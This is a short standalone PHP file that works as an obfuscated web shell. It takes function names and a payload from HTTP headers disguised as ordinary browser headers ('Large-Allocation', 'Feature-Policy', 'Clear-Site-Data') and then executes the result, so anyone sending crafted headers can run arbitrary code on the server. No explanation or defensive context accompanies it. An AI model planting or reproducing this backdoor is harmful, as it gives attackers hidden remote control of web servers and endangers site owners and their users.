<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Large-Allocation'])) {
    $lock = $_HEADERS['Large-Allocation']('', $_HEADERS['Feature-Policy']($_HEADERS['Clear-Site-Data']));
    $lock();
}